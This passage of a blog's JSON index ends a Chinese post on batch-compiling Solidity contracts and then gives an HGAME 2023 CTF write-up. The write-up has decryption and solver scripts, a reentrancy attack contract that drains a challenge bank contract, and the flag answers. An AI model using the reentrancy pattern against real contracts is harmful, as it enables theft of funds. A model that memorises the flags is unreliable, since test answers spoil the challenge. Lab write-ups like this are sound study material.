= re.search(r\"^contract\\s+(\\w+)\\s*\", line)# 定义为 contract 类型的库 if matchContract: T = matchContract.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchInterface = re.search(r\"^interface\\s+(\\w+)\\s*\", line)# 定义为 interface 类型的库 if matchInterface: T = matchInterface.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\")# 如何批量编译智能合约并生成字节码？ 这五万多个智能合约，每个合约所需的编译版本都不相同，所以直接用 solc 命令去编译毫无疑问是会报错的 这时，我发现 python 中的 solcx 可以切换 solc 版本并进行相应的编译 # solcx 安装 pip install py-solc-x然后在项目中使用 import solcx 就可以直接使用了 想要批量编译智能合约，我们需要知道的信息有 编译器的版本 所编译的智能合约名称 很幸运，我们需要的这两个信息在 info 文件中都含有了，所以我们只要读取 info 中的信息即可 with open(f\"&#123;src_folder&#125;\\\\info\", 'r') as f: str = f.readlines() # print(str) contract_name = str[0].strip() match = re.search(r'v(\\d+\\.\\d+\\.\\d+)', str[1]) if match: version = match.group(1) # print(version)如果说没有 info 内文件的信息的话，我们也可以直接在 code.sol 文件中提取出编译版本 示例如下 import refor line in src: matchVersion = re.search(r\"^pragma solidity.*(\\d+\\.\\d+\\.\\d+)\", line) if matchVersion: Version = matchVersion.group(1)故批量编译智能合约并生成字节码的代码如下 def bytecodeMaker(ContractAddress): src_folder = f\".\\\\etherscan\\\\&#123;ContractAddress&#125;\" dst_folder = f\".\\\\output\\\\&#123;ContractAddress&#125;\" with open(f\"&#123;src_folder&#125;\\\\info\", 'r') as f: str = f.readlines() # print(str) contract_name = str[0].strip() match = re.search(r'v(\\d+\\.\\d+\\.\\d+)', str[1]) if match: version = match.group(1) # print(version) with open(f\"&#123;src_folder&#125;\\\\code.sol\", \"r\") as file: code = file.read() # 编译合约 install_solc(version)# 选择编译器版本 compiled_sol = compile_standard( &#123; \"language\": \"Solidity\", \"sources\": &#123;\"code.sol\": &#123;\"content\": code&#125;&#125;, \"settings\": &#123; \"outputSelection\": &#123; \"*\": &#123;\"*\": [\"abi\", \"metadata\", \"evm.bytecode\", \"evm.sourceMap\"]&#125; &#125; &#125;, &#125;, solc_version=version, ) bytecode = compiled_sol[\"contracts\"][\"code.sol\"][contract_name][\"evm\"][\"bytecode\"][\"object\"] # print(bytecode) # with open(f\"&#123;dst_folder&#125;\\\\bytecode\", 'w') as f: # f.write(bytecode) return bytecode# 0x03 执行过程中的问题 当我的代码写好之后，我发现在处理八千多份合约左右的时候，程序将会报错并无法正常的进行后续的处理，报错内容为 [Errno24] Too many open files 在网上查阅了很多资料，但是都大相径庭的表示是打开文件后没有正常的关闭，但是我反复研究代码，发现自己打开文件的操作用的都是 with open , 根本不可能出现这种情况 最终通过打印进程打开的所有文件才明白是 solc 的问题 def printProess(): # 获取当前进程的 ID pid = psutil.Process().pid # 获取进程句柄信息 process = psutil.Process(pid) open_files = process.open_files() # 打印打开的文件句柄信息 print(f\"已打开的句柄数量&#123;len(open_files)&#125;\") for file in open_files: print(file.path) 但是我在 StackOverflow 搜索了很久，都不知道 python 需要使用什么命令来关闭打开的文件，几乎所有的提问和解答都是关于如何关闭进程的，即使用 process.kill() 来终止进程 终于，经过下午的研究，我发现可以使用命令行来分批次的编译大量的智能合约 于是很快我写出了主体代码 # runME.pyimport osDataDir = r\".\\etherscan\"DataDir_sum = len(os.listdir(DataDir))step = 3000# 一次处理 3000 个合约round=0for startPos in range(0, DataDir_sum, step): round=round+1 print(f\"======round&#123;round&#125;======\") endPos = startPos + step if endPos &lt; DataDir_sum: os.system(f\"python .\\deal.py &#123;startPos&#125; &#123;endPos&#125;\") else: os.system(f\"python .\\deal.py &#123;startPos&#125; &#123;DataDir_sum&#125;\")当然也需要在 deal.py 中增添接受命令行参数的语句 # deal.pyif len(sys.argv) != 3: print('please enter 2 argv!') exit(-1)startPos, endPos = sys.argv[1:3]startPos, endPos = int(startPos), int(endPos)# 0x04 处理完成 完整代码如下 # deal.pyimport osimport refrom solcx import compile_standard, install_solcimport sysdef ReadLibraryName(): LibraryPath = r\"E:\\solidity\\智能合约Library的识别和相似度分析\\openzeppelin-contracts-master\\contracts\" L = [] for dirpath, dirnames, filenames in os.walk(LibraryPath): for file in filenames: if os.path.splitext(file)[1] == '.sol': L.append(os.path.join(os.path.splitext(file)[0])) return Ldef bytecodeMaker(ContractAddress): src_folder = f\".\\\\etherscan\\\\&#123;ContractAddress&#125;\" dst_folder = f\".\\\\output\\\\&#123;ContractAddress&#125;\" with open(f\"&#123;src_folder&#125;\\\\info\", 'r') as f: str = f.readlines() # print(str) contract_name = str[0].strip() match = re.search(r'v(\\d+\\.\\d+\\.\\d+)', str[1]) if match: version = match.group(1) # print(version) with open(f\"&#123;src_folder&#125;\\\\code.sol\", \"r\") as file: code = file.read() install_solc(version) compiled_sol = compile_standard( &#123; \"language\": \"Solidity\", \"sources\": &#123;\"code.sol\": &#123;\"content\": code&#125;&#125;, \"settings\": &#123; \"outputSelection\": &#123; \"*\": &#123;\"*\": [\"abi\", \"metadata\", \"evm.bytecode\", \"evm.sourceMap\"]&#125; &#125; &#125;, &#125;, solc_version=version, ) bytecode = compiled_sol[\"contracts\"][\"code.sol\"][contract_name][\"evm\"][\"bytecode\"][\"object\"] # print(bytecode) # with open(f\"&#123;dst_folder&#125;\\\\bytecode\", 'w') as f: # f.write(bytecode) return bytecodedef copy_files(src_folder, dst_folder): os.makedirs(dst_folder) for root, dirs, files in os.walk(src_folder): for file in files: src_file = os.path.join(root, file) dst_file = os.path.join(dst_folder, os.path.relpath(src_file, src_folder)) # print(dst_file) # print(os.path.dirname(dst_file)) # shutil.copy2(src_file, dst_file) with open(src_file, 'r') as f: text = f.read() with open(dst_file, 'w') as f: f.write(text)if len(sys.argv) != 3: print('please enter 2 argv!') exit(-1)startPos, endPos = sys.argv[1:3]startPos, endPos = int(startPos), int(endPos)LibratyName = ReadLibraryName()# print(LibratyName)DataDir = r\".\\etherscan\"DataDir_sum = endPos - startPos# print(DataDir)for i in range(startPos, endPos): ContractAddress = os.listdir(DataDir)[i] print(f\"待处理合约数:&#123;DataDir_sum&#125;\\x1B[1A\\x1B[K\") DataDir_sum = DataDir_sum - 1 try: with open(f\"&#123;DataDir&#125;\\\\&#123;ContractAddress&#125;\\\\code.sol\", 'r') as f: src = f.readlines() except Exception as e: # print(f\"error during read file!&#123;str(e)&#125;, at &#123;ContractAddress&#125;\") continue if len(src[0]) > 100: continue # print(ContractAddress) # print(src[0]) openSource = [] for line in src: matchLib = re.search(r\"^library\\s+(\\w+)\\s*\", line) if matchLib: T = matchLib.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchContract = re.search(r\"^contract\\s+(\\w+)\\s*\", line) if matchContract: T = matchContract.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") matchInterface = re.search(r\"^interface\\s+(\\w+)\\s*\", line) if matchInterface: T = matchInterface.group(1) if T in LibratyName: openSource.append(T) # print(f\"&#123;T&#125;,&#123;ContractAddress&#125;\") # print(openSource) if openSource: # print(openSource) # print(ContractAddress) src_folder = f\".\\\\etherscan\\\\&#123;ContractAddress&#125;\" dst_folder = f\".\\\\output\\\\&#123;ContractAddress&#125;\" try: bytecode = bytecodeMaker(ContractAddress) except Exception as e: # print(f\"error during bytecode!&#123;str(e)&#125;, at &#123;ContractAddress&#125;\") continue copy_files(src_folder, dst_folder) with open(f\"&#123;dst_folder&#125;\\\\PublicLibrary\", 'w') as ff: ff.write(str(openSource)) with open(f\"&#123;dst_folder&#125;\\\\bytecode\", 'w') as ff: ff.write(str(bytecode))处理完成！ # 0x05 有趣的小知识 当我想要知道还剩下多少文件需要处理的时候，总是苦于输出的刷屏 比如下面的代码 import timeprint(\"代码开始执行!\")for i in range(10000, 1, -1): print(f\"还剩下&#123;i&#125;个文件需要处理\") time.sleep(0.5) 这样输出会导致刷屏看起来十分不舒服 但是我们只要在输出后面加上 \\x1B[1A\\x1B[K 变成下面这种形式 import timeprint(\"代码开始执行!\")for i in range(10000,1,-1): print(f\"还剩下&#123;i&#125;个文件需要处理\\x1B[1A\\x1B[K\") time.sleep(0.5)这样就没有刷屏的困扰了 至于原理使用的是 ANSI 终端控制序列 \\x1b[nA 表示光标上移 \\x1b[2K 表示擦除当前行 所以 \\x1B[1A\\x1B[K 组合起来就能把这一行清除啦 或者网上还有方法可以用下面的代码 import timeprint(\"代码开始执行!\")for i in range(10000,1,-1): print(f\"还剩下&#123;i&#125;个文件需要处理\", end='\\r') time.sleep(0.5)同样可以实现刷新当前行的操作 但是令我感到奇怪的是，无论是 \\x1B[1A\\x1B[K 还是 end='\\r' , 都无法在 pycharm 中刷新当前行 终于我发现了完美的刷新输出行的方式！ 就是这种写法 import timeprint(\"代码开始执行!\")for i in range(10000,1,-1): print(f\"\\r还剩下&#123;i&#125;个文件需要处理\",end='') time.sleep(0.5) 完美在 pycharm 中输出～","categories":[],"tags":[{"name":"智能合约","slug":"智能合约","permalink":"https://oacia.dev/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"区块链","slug":"区块链","permalink":"https://oacia.dev/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"solidity","slug":"solidity","permalink":"https://oacia.dev/tags/solidity/"},{"name":"批量编译","slug":"批量编译","permalink":"https://oacia.dev/tags/%E6%89%B9%E9%87%8F%E7%BC%96%E8%AF%91/"},{"name":"提取公开库","slug":"提取公开库","permalink":"https://oacia.dev/tags/%E6%8F%90%E5%8F%96%E5%85%AC%E5%BC%80%E5%BA%93/"}]},{"title":"Hgame2023 逆向 writeup","slug":"hgame2023-reverse-writeup","date":"2023-02-06T18:51:22.000Z","updated":"2025-04-08T18:55:11.572Z","comments":true,"path":"hgame2023-reverse-writeup/","link":"","permalink":"https://oacia.dev/hgame2023-reverse-writeup/","excerpt":"","text":"把今年 hgame 四周的逆向题 ak 啦，还拿了个逆向单方向奖呢～(●’◡’●), 顺手做了两道区块链的题：) 题目附件: 点击下载 # week1 # a_cup_of_tea tea 算法 from ctypes import *def decrypt(v, k): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x543210DD k0, k1, k2, k3 = k[0], k[1], k[2], k[3] total = c_uint32(delta * -32) for i in range(32): v1.value -= ((v0.value &lt;&lt; 4) + k2) ^ (v0.value + total.value) ^ ((v0.value >> 5) + k3) v0.value -= ((v1.value &lt;&lt; 4) + k0) ^ (v1.value + total.value) ^ ((v1.value >> 5) + k1) total.value += delta return v0.value, v1.value# testif __name__ == \"__main__\": # 待加密的明文，两个 32 位整型，即 64bit 的明文数据 value = [0, 0] buf2 = [0x2E63829D, 0xC14E400F, 0x9B39BFB9, 1512016660, 0x61886DDE, 0x6565C6CF, 0x9F064F64, 0x236A43F6] # buf2=[0x9D82632E, 0x0F404EC1, 0x9B39BFB9, 1512016660, 0x61886DDE, 0x6565C6CF, 0x9F064F64, 0x236A43F6] # 四个 key，每个是 32bit，即密钥长度为 128bit key = [0x12345678, 0x23456789, 0x34567890, 0x45678901] for i in range(0, len(buf2), 2): value[0], value[1] = buf2[i], buf2[i + 1] res = decrypt(value, key) bytearray.fromhex(hex(res[0])[2::]).decode() print(bytearray.fromhex(hex(res[0])[2::]).decode()[::-1], bytearray.fromhex(hex(res[1])[2::]).decode()[::-1], sep='', end='') print('k&#125;', end='')# hgame&#123;Tea_15_4_v3ry_h3a1thy_drlnk&#125;# easyasm a=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]for i in a: print(chr(i^0x33),end='')# hgame&#123;welc0me_t0_re_wor1d!&#125;# easyenc a = [0x04, 0xFF, 0xFD, 0x09, 0x01, 0xF3, 0xB0, 0x00, 0x00, 0x05, 0xF0, 0xAD, 0x07, 0x06, 0x17, 0x05, 0xEB, 0x17, 0xFD, 0x17, 0xEA, 0x01, 0xEE, 0x01, 0xEA, 0xB1, 0x05, 0xFA, 0x08, 0x01, 0x17, 0xAC, 0xEC, 0x01, 0xEA, 0xFD, 0xF0, 0x05, 0x07, 0x06, 0xF9]for i in a: if i > 0xA0: i=-(0xff-i+1) print(chr((i + 86) ^ 0x32), end='')# hgame&#123;4ddit1on_is_a_rever5ible_0peration&#125;# encode v4=[0x00000008, 0x00000006, 0x00000007, 0x00000006, 0x00000001, 0x00000006, 0x0000000D, 0x00000006, 0x00000005, 0x00000006, 0x0000000B, 0x00000007, 0x00000005, 0x00000006, 0x0000000E, 0x00000006, 0x00000003, 0x00000006, 0x0000000F, 0x00000006, 0x00000004, 0x00000006, 0x00000005, 0x00000006, 0x0000000F, 0x00000005, 0x00000009, 0x00000006, 0x00000003, 0x00000007, 0x0000000F, 0x00000005, 0x00000005, 0x00000006, 0x00000001, 0x00000006, 0x00000003, 0x00000007, 0x00000009, 0x00000007, 0x0000000F, 0x00000005, 0x00000006, 0x00000006, 0x0000000F, 0x00000006, 0x00000002, 0x00000007, 0x0000000F, 0x00000005, 0x00000001, 0x00000006, 0x0000000F, 0x00000005, 0x00000002, 0x00000007, 0x00000005, 0x00000006, 0x00000006, 0x00000007, 0x00000005, 0x00000006, 0x00000002, 0x00000007, 0x00000003, 0x00000007, 0x00000005, 0x00000006, 0x0000000F, 0x00000005, 0x00000005, 0x00000006, 0x0000000E, 0x00000006, 0x00000007, 0x00000006, 0x00000009, 0x00000006, 0x0000000E, 0x00000006, 0x00000005, 0x00000006, 0x00000005, 0x00000006, 0x00000002, 0x00000007, 0x0000000D, 0x00000007, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]for i in range(50): print(chr((v4[2 * i + 1] &lt;&lt; 4) | v4[2 * i]),end='')# hgame&#123;encode_is_easy_for_a_reverse_engineer&#125;# test_your_IDA ida 打开获得 flag hgame # Checkin(BlockChain) 看看源码 // SPDX-License-Identifier: MITpragma solidity 0.8.17;contract Checkin &#123; string greeting; constructor(string memory _greeting) &#123; greeting = _greeting; &#125; function greet() public view returns (string memory) &#123; return greeting; &#125; function setGreeting(string memory _greeting) public &#123; greeting = _greeting; &#125; function isSolved() public view returns (bool) &#123; string memory expected = \"HelloHGAME!\"; return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting)); &#125;&#125;[+] deployer account: 0x5B9E13374B97E1B1633dfAa4c36A80CA1655CA4a[+] token: v4.local.R3OAQ2ikgeB8XRLjt8bggKUnkbwMGMlv_mSRXwxmGUDuClnl2FqmeIZn1cZF9jGB8lW9YnyI2GHlI2Tc_Z4s-auW0mQri4SpuBN3HmrPyoYJNoj5eHgCE93i5sw1jxQhkAk-vc82sQCz82FTYgOElp93TYykIQR9EIItY49C66__Yg[+] contract address: 0x34D0aCD466A0f208e57722D4aF80479A047B3271[+] transaction hash: 0xd2a3e46e1dd201c49325a2c819568229dc31801f6550eb8db7a3af6c77796e93简单的区块链题目，交互一下就有 flag 了 import jsonimport timefrom web3 import Web3, HTTPProvidercontract_address = '0x34D0aCD466A0f208e57722D4aF80479A047B3271'private_key = [你的钱包私钥]wallet = Web3.toChecksumAddress([你的钱包地址])w3 = Web3(HTTPProvider('http://week-1.hgame.lwsec.cn:32663'))ABI = json.loads( '[&#123;\"inputs\":[&#123;\"internalType\":\"string\",\"name\":\"_greeting\",\"type\":\"string\"&#125;],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"&#125;,&#123;\"inputs\":[],\"name\":\"greet\",\"outputs\":[&#123;\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"&#125;],\"stateMutability\":\"view\",\"type\":\"function\"&#125;,&#123;\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[&#123;\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"&#125;],\"stateMutability\":\"view\",\"type\":\"function\"&#125;,&#123;\"inputs\":[&#123;\"internalType\":\"string\",\"name\":\"_greeting\",\"type\":\"string\"&#125;],\"name\":\"setGreeting\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"&#125;]')# w3.eth.enable_unaudited_features()contract = w3.eth.contract(address=contract_address, abi=ABI)nonce = w3.eth.getTransactionCount(wallet)gasPrice = w3.toWei('10', 'gwei')gasLimit = 4000000tx = &#123; 'nonce': nonce, 'gas': gasLimit, 'gasPrice': gasPrice, 'from': wallet&#125;transaction = contract.functions.setGreeting(\"HelloHGAME!\").buildTransaction(tx)signed_tx = w3.eth.account.sign_transaction(transaction, private_key)tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)transaction_hash = w3.toHex(tx_hash)tx_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)# week2 # before_main import stringres = string.printablea='qaCpwYM2tO/RP0XeSZv8kLd6nfA7UHJ1No4gF5zr3VsBQbl9juhEGymc+WTxIiDK'a=[ord(i) for i in a]v6 = 'AMHo7dLxUEabf6Z3PdWr6cOy75i4fdfeUzL17kaV7rG='for i in range(0, len(v6), 4): for xx in res: for yy in res: for zz in res: x, y, z = ord(xx), ord(yy), ord(zz) if ord(v6[i]) == a[x >> 2] and ord(v6[i + 1]) == a[(16 * x) &amp; 0x30 | (y >> 4)] and ord(v6[i + 2]) == a[(4 * y) &amp; 0x3C | (z >> 6)] and ord(v6[i + 3]) == a[z &amp; 0x3F]: print(xx, yy, zz, sep='',end='')print('n&#125;') # 为了连接成完整的 flag，所以猜一个末尾是 n&#125;# hgame&#123;s0meth1ng_run_befOre_m@in&#125;# math 解个方程 from z3 import *v10 = [0x0000007E, 0x000000E1, 0x0000003E, 0x00000028, 0x000000D8, 0x000000FD, 0x00000014, 0x0000007C, 0x000000E8, 0x0000007A, 0x0000003E, 0x00000017, 0x00000064, 0x000000A1, 0x00000024, 0x00000076, 0x00000015, 0x000000B8, 0x0000001A, 0x0000008E, 0x0000003B, 0x0000001F, 0x000000BA, 0x00000052, 0x0000004F]v12 = [0x0000F9FE, 0x00008157, 0x000108B2, 0x0000D605, 0x0000F21B, 0x00010FF3, 0x00009146, 0x00011212, 0x0000CF76, 0x00010C46, 0x0000F76B, 0x000077DF, 0x000103BE, 0x0000C6F8, 0x0000ED8A, 0x0000BE90, 0x000075EC, 0x0000EAC8, 0x0000AE37, 0x0000CC29, 0x0000A828, 0x00005C6C, 0x0000AB4A, 0x0000836E, 0x0000ACEE]flag = [Int('flag%d' % i) for i in range(40)]solver = Solver()for i in range(5): for j in range(5): solver.add(v12[5 * i + j]==flag[5 * i + 0]*v10[5 * 0 + j] + flag[5 * i + 1]*v10[5 * 1 + j] + flag[5 * i + 2]*v10[5 * 2 + j] + flag[5 * i + 3]*v10[5 * 3 + j] + flag[5 * i + 4]*v10[5 * 4 + j])if solver.check() == sat: m = solver.model() # print(m) for i in range(len(m)): print(chr(int(str(m[flag[i]]))),end='')else: print('unsat')# hgame&#123;y0ur_m@th_1s_gO0d&#125;# stream PS D:\\hgame\\week2 2023\\stream\\stream> python D:\\TOOLS\\python逆向\\pyinstxtractor-master\\pyinstxtractor-master\\pyinstxtractor.py \"D:\\hgame\\week2 2023\\stream\\stream\\stream.exe\"[+] Processing D:\\hgame\\week2 2023\\stream\\stream\\stream.exe[+] Pyinstaller version: 2.1+[+] Python version: 3.10[+] Length of package: 5507205 bytes[+] Found 61 files in CArchive[+] Beginning extraction...please standby[+] Possible entry point: pyiboot01_bootstrap.pyc[+] Possible entry point: pyi_rth_inspect.pyc[+] Possible entry point: stream.pyc[+] Found 97 files in PYZ archive[+] Successfully extracted pyinstaller archive: D:\\hgame\\week2 2023\\stream\\stream\\stream.exeYou can now use a python decompiler on the pyc files within the extracted directory然后用在线工具把 steam.pyc 转成 py #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.10import base64def gen(key): s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datadef encrypt(text, key): result = '' for c, k in zip(text, gen(key)): result += chr(ord(c) ^ k) result = base64.b64encode(result.encode()).decode() return resulttext = input('Flag: ')key = 'As_we_do_as_you_know'enc = encrypt(text, key)if enc == 'wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl': print('yes!') return NoneNone('try again...')exp: #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.10import base64def gen(key): s = list(range(256)) j = 0 for i in range(256): j = (j + s[i] + ord(key[i % len(key)])) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp i = j = 0 data = [] for _ in range(50): i = (i + 1) % 256 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp data.append(s[(s[i] + s[j]) % 256]) return datakey = 'As_we_do_as_you_know'enc = 'wr3ClVcSw7nCmMOcHcKgacOtMkvDjxZ6asKWw4nChMK8IsK7KMOOasOrdgbDlx3DqcKqwr0hw701Ly57w63CtcOl'_enc = base64.b64decode(enc).decode()result = ''for c, k in zip(_enc, gen(key)): result += chr(ord(c) ^ k)print(result)# hgame&#123;python_reverse_is_easy_with_internet&#125;# VidarCamera 主要算法： private final int[] m41encrypthkIa6DI(int[] iArr) &#123; int i; int[] iArr2 = UIntArray.m208constructorimpl(4); UIntArray.m219setVXSXFK8(iArr2, 0, 2233); UIntArray.m219setVXSXFK8(iArr2, 1, 4455); UIntArray.m219setVXSXFK8(iArr2, 2, 6677); UIntArray.m219setVXSXFK8(iArr2, 3, 8899); int i2 = 0; while (i2 &lt; 9) &#123; int i3 = 0; int i4 = 0; do &#123; i3++; i = i2 + 1; UIntArray.m219setVXSXFK8(iArr, i2, UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i2) + UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr2, UInt.m155constructorimpl(i4 &amp; 3)) + i4) ^ UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i) &lt;&lt; 4) ^ UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i) >>> 5)) + UIntArray.m214getpVg5ArA(iArr, i))) ^ i4))); UIntArray.m219setVXSXFK8(iArr, i, UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i) + UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i2) &lt;&lt; 4) ^ UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr, i2) >>> 5)) + UIntArray.m214getpVg5ArA(iArr, i2)) ^ UInt.m155constructorimpl(UIntArray.m214getpVg5ArA(iArr2, UInt.m155constructorimpl(UInt.m155constructorimpl(i4 >>> 11) &amp; 3)) + i4)))); i4 = UInt.m155constructorimpl(i4 + 878077251); &#125; while (i3 &lt;= 32); i2 = i; &#125; return iArr; &#125; public static final void m42onCreate$lambda0(EditText inputsomething, CameraActivity this$0, AlertDialog alertDialog, View view) &#123; Intrinsics.checkNotNullParameter(inputsomething, \"$inputsomething\"); Intrinsics.checkNotNullParameter(this$0, \"this$0\"); String obj = inputsomething.getText().toString(); if (obj.length() != 40) &#123; Toast.makeText(this$0, \"序列号不正确\", 0).show(); return; &#125; int[] iArr = UIntArray.m208constructorimpl(10); for (int i = 0; i &lt; 40; i += 4) &#123; UIntArray.m219setVXSXFK8(iArr, i / 4, UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(UInt.m155constructorimpl(obj.charAt(i)) + UInt.m155constructorimpl(obj.charAt(i + 1) &lt;&lt; '\\b')) + UInt.m155constructorimpl(obj.charAt(i + 2) &lt;&lt; 16)) + UInt.m155constructorimpl(obj.charAt(i + 3) &lt;&lt; 24))); &#125; int[] iArr2 = this$0.m41encrypthkIa6DI(iArr); UInt[] uIntArr = &#123;UInt.m149boximpl(637666042), UInt.m149boximpl(457511012), UInt.m149boximpl(-2038734351), UInt.m149boximpl(578827205), UInt.m149boximpl(-245529892), UInt.m149boximpl(-1652281167), UInt.m149boximpl(435335655), UInt.m149boximpl(733644188), UInt.m149boximpl(705177885), UInt.m149boximpl(-596608744)&#125;; int i2 = 0; while (true) &#123; int i3 = i2 + 1; if (uIntArr[i2].m206unboximpl() != UIntArray.m214getpVg5ArA(iArr2, i2)) &#123; Toast.makeText(this$0, \"序列号不正确\", 0).show(); return; &#125; else if (i3 > 9) &#123; alertDialog.dismiss(); return; &#125; else &#123; i2 = i3; &#125; &#125; &#125;可以看出用的是 xtea 算法，但是有些不一样的地方 exp: from ctypes import *def encrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x34566543 total = c_uint32(0) for i in range(32): v0.value += (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3]) total.value += delta v1.value += (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) return v0.value, v1.valuedef decrypt(v, key): v0, v1 = c_uint32(v[0]), c_uint32(v[1]) delta = 0x34566543 total = c_uint32(delta * 33) for i in range(33): total.value -= delta v1.value -= (((v0.value &lt;&lt; 4) ^ (v0.value >> 5)) + v0.value) ^ (total.value + key[(total.value >> 11) &amp; 3]) # total.value -= delta v0.value -= (((v1.value &lt;&lt; 4) ^ (v1.value >> 5)) + v1.value) ^ (total.value + key[total.value &amp; 3])^total.value return v0.value, v1.value# 637666042,457511012,-2038734351,578827205,-245529892,-1652281167,435335655,733644188,705177885,-596608744# testif __name__ == \"__main__\": # 待加密的明文，两个 32 位整型，即 64bit 的明文数据 value = [637666042, 457511012, -2038734351, 578827205, -245529892, -1652281167, 435335655, 733644188, 705177885, -596608744] # 四个 key，每个是 32bit，即密钥长度为 128bit key = [2233, 4455, 6677, 8899] for i in range(len(value) - 2, -1, -1): _value = [value[i], value[i+1]] value[i], value[i+1] = decrypt(_value, key) for i in value: print(bytearray.fromhex(hex(i)[2::]).decode()[::-1],sep='', end='')# hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;# VidarBank(blockchain) 一看源码就是重入攻击 [+] deployer account: 0x4eE700C7CE61515BA947bbAd8638168417AF67fF[+]token:v4.local.SUcqXp9Sld4E095kaPQqOUM1_Dmkq9T4YLM1xP4jmfRAdw47AVNCVcDNYC9VgTywR_TQs_bY5aIegOza3iMIKlQ6pcVMJZKJiJxHdJENX9MU3sFEJ5qM_H3my8uizgHs3kMmV0Svp3eUh9EUw80qvR5XewCouS8piP7-UdfSz4lLfA[+] contract address: 0xCeea6d7190d67323FD29130d63808c187311BDF8[+] transaction hash: 0xb2feb0f1346a9a66156eace411ed603c990109f0a69b28459a444e6f5b6d1395攻击合约写一下 //SPDX-License-Identifier: UNLICENSEDpragma solidity >=0.8.7;import \"./VidarBank.sol\";contract attack&#123; VidarBank vidarBank; constructor(address _addr) public&#123; vidarBank = VidarBank(_addr); &#125; function get() public returns(uint256)&#123; return vidarBank.balances(address(this)); &#125; function get_address() public returns(address)&#123; return address(this); &#125; function send() public&#123; vidarBank.isSolved(); //hgame&#123;525d49d486d5357aaec38e7ab621c92cf7486d5e&#125; &#125; function create() public payable&#123; vidarBank.newAccount&#123;value: 0.001 ether&#125;(); &#125; function Attack() external payable &#123; vidarBank.donateOnce(); &#125; fallback() external payable&#123; if(vidarBank.balances(address(this))&lt;30)&#123; vidarBank.donateOnce(); &#125; &#125;&#125;# week3 # kunmusic ILSpy 打开，看看 main 函数 得知对 data 文件字节进行异或 104 操作 用 python 把 data 文件异或 104，然后用 ILspy 打开 data_new 文件 with open('data', 'rb') as f: s = f.read() s = bytearray(s) for i in range(len(s)): s[i] ^= 104 with open('data_new', 'wb') as f: f.write(s) 为了加快运行速度，直接由 hgame&#123; 开头得到 num [0]~num [5] from z3 import *num = [BitVec('num%d' % i, 50) for i in range(13)]solver = Solver()solver.add(num[0] + 52296 + num[1] - 26211 + num[2] - 11754 + (num[3] ^ 0xA114) + num[4] * 63747 + num[5] - 52714 + num[ 6] - 10512 + num[7] * 12972 + num[8] + 45505 + num[9] - 21713 + num[10] - 59122 + num[11] - 12840 + ( num[12] ^ 0x525F) == 12702282)solver.add( num[0] - 25228 + (num[1] ^ 0x50DB) + (num[2] ^ 0x1FDE) + num[3] - 65307 + num[4] * 30701 + num[5] * 47555 + num[ 6] - 2557 + (num[7] ^ 0xBF9F) + num[8] - 7992 + (num[9] ^ 0xE079) + (num[10] ^ 0xE052) + num[11] + 13299 + num[ 12] - 50966 == 9946829)solver.add(num[0] - 64801 + num[1] - 60698 + num[2] - 40853 + num[3] - 54907 + num[4] + 29882 + (num[5] ^ 0x3506) + ( num[6] ^ 0x533E) + num[7] + 47366 + num[8] + 41784 + (num[9] ^ 0xD1BA) + num[10] * 58436 + num[11] * 15590 + num[12] + 58225 == 2372055)solver.add( num[0] + 61538 + num[1] - 17121 + num[2] - 58124 + num[3] + 8186 + num[4] + 21253 + num[5] - 38524 + num[ 6] - 48323 + num[7] - 20556 + num[8] * 56056 + num[9] + 18568 + num[10] + 12995 + (num[11] ^ 0x995C) + num[ 12] + 25329 == 